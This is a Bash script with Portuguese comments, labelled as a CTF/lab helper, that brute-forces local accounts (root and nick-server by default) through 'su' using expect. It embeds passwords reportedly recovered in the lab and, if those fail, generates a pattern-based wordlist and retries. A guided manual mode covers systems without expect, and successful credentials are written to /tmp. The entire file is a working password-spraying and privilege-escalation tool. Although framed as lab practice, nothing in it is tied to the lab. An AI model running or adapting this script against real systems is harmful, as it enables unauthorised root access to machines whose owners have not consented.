#!/usr/bin/env bash
# su spray helper (CTF/lab): testa lista de senhas contra usuarios locais via expect.
# Uso:
#   bash su_password_spray.sh
#   bash su_password_spray.sh --wordlist /caminho/old-passwds --users "root nick-server"
#   bash su_password_spray.sh --users "root" --stop-on-hit
#teste
# Observacoes:
# - Com expect: tenta automaticamente.
# - Sem expect: entra em modo manual guiado (mostra tentativa por tentativa).
# - Nao usa sudo; automatiza/guia tentativas de "su - <user>".

set -euo pipefail

WORDLIST=""
USERS="root nick-server"
STOP_ON_HIT=0
TIMEOUT_SECS=5
MANUAL_MODE=0
MAX_PASSWORDS=0
AUTO_GENERATE_ON_FAIL=1
GENERATED_WORDLIST_PATH="$(pwd)/wordlist.txt"

# Senhas embutidas (inclui as encontradas no lab):
# - 424242   (passphrase da key SSH)
# - crazycat (senha do Backup.zip)
# - ZeqlcR2!4gN (credencial reutilizada)
EMBEDDED_PASSWORDS=(
  "424242"
  "crazycat"
  "ZeqlcR2!4gN"
  "nickj"
  "nick-server"
  "root"
  "admin"
  "password"
  "123456"
)

# Senhas conhecidas de /sshnickj.txt (linhas 50-74 do lab)
KNOWN_NICKJ_PASSWORDS=(
  "nick3saturno8"
  "nick1terra0"
  "nick5mercurio#8"
  "nick4netuno7"
  "nick2venus2"
  "nick4terra\$7"
  "nick2terra1"
  "nick5jupiter-7"
  "nick0mercurio!5"
  "nick3saturno9"
  "nick1jupiter*2"
  "nick4venus7"
  "nick7marte!3"
  "nick6urano2"
  "nick5saturno5"
  "nick1netuno-0"
  "nick0marte0"
  "nick9jupiter-4"
  "nick3urano\$7"
  "nick7terra!7"
  "nick4jupiter-8"
  "nick2saturno!6"
  "nick4urano*4"
  "nick6netuno7"
  "nick1netuno\$2"
)

usage() {
  cat <<'EOF'
Uso:
  su_password_spray.sh [--users "root nick-server"] [--stop-on-hit] [--timeout 5] [--manual] [--max-passwords 200] [--no-auto-generate] [--wordlist <arquivo>]

Opcoes:
  --wordlist <arquivo>   Arquivo com 1 senha por linha (opcional, soma com embutidas na fase 1).
  --users "u1 u2"        Usuarios alvo separados por espaco (default: "root nick-server").
  --stop-on-hit          Para ao primeiro sucesso.
  --timeout <seg>        Timeout por tentativa (default: 5).
  --manual               Forca modo manual guiado (mesmo que expect exista).
  --max-passwords <n>    Limita qtd de senhas testadas (0 = sem limite, default: 0).
  --no-auto-generate     Nao chama gerador se fase de senhas conhecidas falhar.
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --wordlist) WORDLIST="${2:-}"; shift 2 ;;
    --users) USERS="${2:-}"; shift 2 ;;
    --stop-on-hit) STOP_ON_HIT=1; shift ;;
    --timeout) TIMEOUT_SECS="${2:-5}"; shift 2 ;;
    --manual) MANUAL_MODE=1; shift ;;
    --max-passwords) MAX_PASSWORDS="${2:-0}"; shift 2 ;;
    --no-auto-generate) AUTO_GENERATE_ON_FAIL=0; shift ;;
    -h|--help) usage; exit 0 ;;
    *) echo "[!] Opcao invalida: $1" >&2; usage; exit 1 ;;
  esac
done

if [[ -n "${WORDLIST}" && ! -f "${WORDLIST}" ]]; then
  echo "[!] Arquivo de --wordlist nao existe: ${WORDLIST}" >&2
  exit 1
fi

HAVE_EXPECT=1
if ! command -v expect >/dev/null 2>&1; then
  HAVE_EXPECT=0
fi

TMP_OUT="/tmp/su_spray_hits_$$.txt"
: > "${TMP_OUT}"

PASS_FILE="/tmp/su_spray_passwords_known_$$.txt"
GEN_PASS_FILE="/tmp/su_spray_passwords_generated_$$.txt"
cleanup() {
  rm -f "${PASS_FILE}" "${GEN_PASS_FILE}" 2>/dev/null || true
}
trap cleanup EXIT

# Gerador interno: cria wordlist no diretorio atual (nao depende de arquivo externo).
generate_local_wordlist() {
  local out_file="$1"
  local planetas=("terra" "saturno" "mercurio" "netuno" "venus" "jupiter" "marte" "urano")
  local simbolos=("" "!" "@" "#" "$" "%" "-" "*")
  : > "${out_file}"
  for i in {0..9}; do
    for p in "${planetas[@]}"; do
      for s in "${simbolos[@]}"; do
        for f in {0..9}; do
          printf 'nick%s%s%s%s\n' "${i}" "${p}" "${s}" "${f}" >> "${out_file}"
        done
      done
    done
  done
}

# FASE 1: junta conhecidas (embutidas + lista 50-74 + wordlist opcional)
printf '%s\n' "${EMBEDDED_PASSWORDS[@]}" > "${PASS_FILE}"
printf '%s\n' "${KNOWN_NICKJ_PASSWORDS[@]}" >> "${PASS_FILE}"
if [[ -n "${WORDLIST}" ]]; then
  cat "${WORDLIST}" >> "${PASS_FILE}"
fi
# Limpeza: remove comentarios, espacos extras, linhas vazias e entradas com espaco interno.
sed -e 's/\r$//' -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' "${PASS_FILE}" \
  | sed '/^$/d' \
  | sed '/^#/d' \
  | awk 'index($0," ")==0' > "${PASS_FILE}.clean"
mv "${PASS_FILE}.clean" "${PASS_FILE}"
awk '!seen[$0]++' "${PASS_FILE}" > "${PASS_FILE}.uniq"
mv "${PASS_FILE}.uniq" "${PASS_FILE}"
if [[ "${MAX_PASSWORDS}" -gt 0 ]]; then
  head -n "${MAX_PASSWORDS}" "${PASS_FILE}" > "${PASS_FILE}.lim"
  mv "${PASS_FILE}.lim" "${PASS_FILE}"
fi

echo "[*] Wordlist externa: ${WORDLIST:-<nenhuma>}"
echo "[*] Senhas embutidas: ${#EMBEDDED_PASSWORDS[@]}"
echo "[*] Senhas conhecidas 50-74: ${#KNOWN_NICKJ_PASSWORDS[@]}"
echo "[*] Total fase 1 (conhecidas): $(wc -l < "${PASS_FILE}")"
echo "[*] Usuarios: ${USERS}"
echo "[*] Timeout por tentativa: ${TIMEOUT_SECS}s"
echo "[*] Expect disponivel: ${HAVE_EXPECT}"

try_su_once() {
  local user="$1"
  local pass="$2"

  expect <<EOF
    log_user 0
    set timeout ${TIMEOUT_SECS}
    spawn su - ${user} -c "id -u"
    expect {
      -re "(?i)password:" { send -- "${pass}\r" }
      timeout { exit 3 }
      eof { exit 4 }
    }
    expect {
      -re "^0\\r?\\n" { exit 0 }
      -re "^[0-9]+\\r?\\n" { exit 1 }
      -re "(?i)(authentication failure|failure)" { exit 2 }
      -re "(?i)(incorrect password|senha incorreta)" { exit 2 }
      timeout { exit 3 }
      eof { exit 4 }
    }
EOF
}

attempts=0
hits=0

manual_guide_file() {
  local pass_file="$1"
  local phase_name="$2"
  echo
  echo "[*] Modo manual guiado ativo (${phase_name})."
  echo "[*] Para cada tentativa, o script vai mostrar: usuario + senha."
  echo "[*] Tu executas 'su - <user>' e colas a senha sugerida."
  echo "[*] Depois responde ao prompt: s=sucesso / n=falha / q=sair."
  echo

  while IFS= read -r password || [[ -n "$password" ]]; do
    [[ -z "$password" ]] && continue
    for user in ${USERS}; do
      attempts=$((attempts + 1))
      echo "=================================================="
      echo "[*] Tentativa #${attempts}"
      echo "    Usuario: ${user}"
      echo "    Senha  : ${password}"
      echo
      echo "Comando:"
      echo "  su - ${user}"
      echo
      printf "Resultado? [s=sucesso / n=falha / q=sair]: "
      # Importante: em modo manual, o loop le senhas de arquivo.
      # A resposta do operador deve vir do terminal, nao do arquivo.
      if [[ -r /dev/tty ]]; then
        read -r ans < /dev/tty
      else
        read -r ans
      fi
      case "${ans}" in
        s|S)
          echo "[+] HIT user=${user} senha=${password}"
          echo "${user}:${password}" >> "${TMP_OUT}"
          hits=$((hits + 1))
          if [[ "${STOP_ON_HIT}" -eq 1 ]]; then
            echo "[+] stop-on-hit ativo. Encerrando."
            echo "[+] Resultado em: ${TMP_OUT}"
            exit 0
          fi
          ;;
        q|Q)
          echo "[*] Encerrado pelo utilizador."
          return
          ;;
        *)
          ;;
      esac
    done
  done < "${pass_file}"
}

run_file_expect() {
  local pass_file="$1"
  local phase_name="$2"
  echo
  echo "[*] Fase ${phase_name}: tentativa automatica com expect"
  while IFS= read -r password || [[ -n "$password" ]]; do
  [[ -z "$password" ]] && continue
  for user in ${USERS}; do
    attempts=$((attempts + 1))
    printf '[*] Tentando user=%s senha=%s\n' "${user}" "${password}"
    if try_su_once "${user}" "${password}"; then
      echo "[+] HIT user=${user} senha=${password}"
      echo "${user}:${password}" >> "${TMP_OUT}"
      hits=$((hits + 1))
      if [[ "${STOP_ON_HIT}" -eq 1 ]]; then
        echo "[+] stop-on-hit ativo. Encerrando."
        echo "[+] Resultado em: ${TMP_OUT}"
        exit 0
      fi
    fi
  done
done < "${pass_file}"
}

# Executa fase 1 (senhas conhecidas)
if [[ "${MANUAL_MODE}" -eq 1 || "${HAVE_EXPECT}" -eq 0 ]]; then
  if [[ "${HAVE_EXPECT}" -eq 0 ]]; then
    echo "[!] expect nao encontrado. A cair para modo manual guiado."
  fi
  manual_guide_file "${PASS_FILE}" "1 - conhecidas"
else
  run_file_expect "${PASS_FILE}" "1 - conhecidas"
fi

# Fase 2: se nenhuma senha funcionou, chama gerador e tenta a wordlist gerada
if [[ "${hits}" -eq 0 && "${AUTO_GENERATE_ON_FAIL}" -eq 1 ]]; then
  echo
  echo "[*] Nenhum hit na fase 1. Iniciando fase 2 (gerador interno)."
  generate_local_wordlist "${GENERATED_WORDLIST_PATH}"
  if [[ -f "${GENERATED_WORDLIST_PATH}" ]]; then
      cp "${GENERATED_WORDLIST_PATH}" "${GEN_PASS_FILE}"
      sed -e 's/\r$//' -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' "${GEN_PASS_FILE}" \
        | sed '/^$/d' \
        | sed '/^#/d' \
        | awk 'index($0," ")==0' > "${GEN_PASS_FILE}.clean"
      mv "${GEN_PASS_FILE}.clean" "${GEN_PASS_FILE}"
      awk '!seen[$0]++' "${GEN_PASS_FILE}" > "${GEN_PASS_FILE}.uniq"
      mv "${GEN_PASS_FILE}.uniq" "${GEN_PASS_FILE}"
      if [[ "${MAX_PASSWORDS}" -gt 0 ]]; then
        head -n "${MAX_PASSWORDS}" "${GEN_PASS_FILE}" > "${GEN_PASS_FILE}.lim"
        mv "${GEN_PASS_FILE}.lim" "${GEN_PASS_FILE}"
      fi
      echo "[*] Total fase 2 (gerada): $(wc -l < "${GEN_PASS_FILE}")"
      if [[ "${MANUAL_MODE}" -eq 1 || "${HAVE_EXPECT}" -eq 0 ]]; then
        manual_guide_file "${GEN_PASS_FILE}" "2 - gerada"
      else
        run_file_expect "${GEN_PASS_FILE}" "2 - gerada"
      fi
  else
    echo "[!] Falha ao gerar ${GENERATED_WORDLIST_PATH}"
  fi
fi

echo
echo "[*] Tentativas: ${attempts}"
echo "[*] Hits: ${hits}"
if [[ "${hits}" -gt 0 ]]; then
  echo "[+] Credenciais encontradas:"
  cat "${TMP_OUT}"
  echo "[+] Arquivo: ${TMP_OUT}"
else
  echo "[-] Nenhum hit encontrado."
  rm -f "${TMP_OUT}" || true
fi

